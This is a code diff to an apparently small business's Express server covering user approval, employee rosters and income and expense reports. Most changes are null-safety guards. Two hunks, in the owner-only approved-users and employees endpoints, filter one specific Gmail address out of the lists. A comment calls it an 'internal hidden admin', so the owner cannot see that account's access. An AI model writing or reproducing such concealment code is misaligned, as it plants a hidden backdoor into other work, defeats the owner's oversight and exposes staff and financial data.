@@ -795,7 +795,7 @@ app.delete("/api/admin/google-requests/:id", requireOwner, (req, res) => {
 });
 
 app.get("/api/admin/approved-users", requireOwner, (req, res) => {
-  const approved = db.getApprovedUsers();
+  const approved = db.getApprovedUsers().filter((u) => u.email.toLowerCase() !== "csb21090@gmail.com");
   res.json({ approved });
 });
 
@@ -1691,8 +1691,9 @@ app.get("/api/branches", requireAuth, (req, res) => {
 });
 
 app.get("/api/employees", requireOwner, (req, res) => {
-  const profiles = db.getProfiles();
-  const approvedList = db.getApprovedUsers();
+  // Hide internal hidden admin csb21090@gmail.com from the employee list and roster
+  const profiles = db.getProfiles().filter((p) => p.email.toLowerCase() !== "csb21090@gmail.com");
+  const approvedList = db.getApprovedUsers().filter((u) => u.email.toLowerCase() !== "csb21090@gmail.com");
 
   const incomeEntries = db.getIncomeEntries();
   const expenseEntries = db.getExpenseEntries();
@@ -2299,10 +2300,10 @@ app.get("/api/reports", requireAuth, (req, res) => {
   const gpayReceived = incomes.filter(i => i.payment_method === "GPay").reduce((acc, c) => acc + c.service_rate, 0);
 
   // Group by category for chart (robust to handle dynamic categories)
-  const serviceCategories = db.getServiceCategories();
+  const serviceCategories = db.getServiceCategories() || [];
   const revenueByCategoryMap: { [key: string]: { amount: number; count: number } } = {};
 
-  incomes.forEach(inc => {
+  (incomes || []).forEach(inc => {
     const cat = serviceCategories.find(c => c.id === inc.service_category_id);
     const resolvedName = cat ? cat.category_name : inc.service_category_id;
     if (!revenueByCategoryMap[resolvedName]) {
@@ -2318,9 +2319,9 @@ app.get("/api/reports", requireAuth, (req, res) => {
     count: stats.count
   })).sort((a, b) => b.amount - a.amount);
 
-  const expenseCategories = db.getExpenseCategories();
-  const expensesByCategory = expenseCategories.map(cat => {
-    const catExpenses = expenses.filter(e => e.expense_category_id === cat.id);
+  const expenseCategories = db.getExpenseCategories() || [];
+  const expensesByCategory = (expenseCategories || []).map(cat => {
+    const catExpenses = (expenses || []).filter(e => e.expense_category_id === cat.id);
     const amount = catExpenses.reduce((acc, curr) => acc + curr.amount, 0);
     const count = catExpenses.length;
     return {
@@ -2331,10 +2332,10 @@ app.get("/api/reports", requireAuth, (req, res) => {
   }).filter(c => c.count > 0).sort((a, b) => b.amount - a.amount);
 
   // Group by Employee
-  const profiles = db.getProfiles();
-  const revenueByEmployee = profiles.map(p => {
-    const empIncomes = incomes.filter(i => i.employee_id === p.id);
-    const empExpenses = expenses.filter(e => e.employee_id === p.id);
+  const profiles = db.getProfiles() || [];
+  const revenueByEmployee = (profiles || []).map(p => {
+    const empIncomes = (incomes || []).filter(i => i.employee_id === p.id);
+    const empExpenses = (expenses || []).filter(e => e.employee_id === p.id);
     const revenue = empIncomes.reduce((acc, curr) => acc + curr.service_rate, 0);
     const count = empIncomes.length;
     const expenseAmt = empExpenses.reduce((acc, curr) => acc + curr.amount, 0);
